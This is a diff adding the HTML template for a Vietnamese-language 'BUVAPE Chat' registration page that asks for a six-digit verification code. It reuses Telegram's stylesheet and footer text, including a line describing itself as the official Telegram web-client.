@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+
+<head>
+    <title>BUVAPE Chat</title>
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css"/>
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css"/>
+    <link href="/css/telegram.css" rel="stylesheet" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <div class="background-color-blue"></div>
+    <div class="login-page">
+        <div class="top-login-page">
+            <a class="logo-top-page" href="#" targer="_blank">
+                <b class="icon-top-page"></b>
+                <!-- <i class = "icon-top-page-title"></i> -->
+                <span class="bv">BUVAPE</span>
+            </a>
+        </div>
+        <div class="login-form">
+            <div class="in-login">
+                <h3>Đăng ký</h3>
+                <p class="p1">Vui lòng nhập mã phía dưới.</p>
+                <div class="label3">
+                    <input class="email" type="hidden" name="email"  value="{{email}}" id="email" readonly>
+                    <input class="code_number" type="text" name="phone-number" minlength="6" maxlength="6" id="code_number"
+                        placeholder="######" autofocus>
+                </div>
+            </div>
+
+        </div>
+        <div class="bottom-login-page">
+            <p class="introduction">Welcome to the official Telegram web-client.</p>
+            <a class="link-learn-more" href="https://web.telegram.org/#/login">Learn more</a>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>
+    <script src="/js/validate.js"></script>
+</body>
+
+</html>
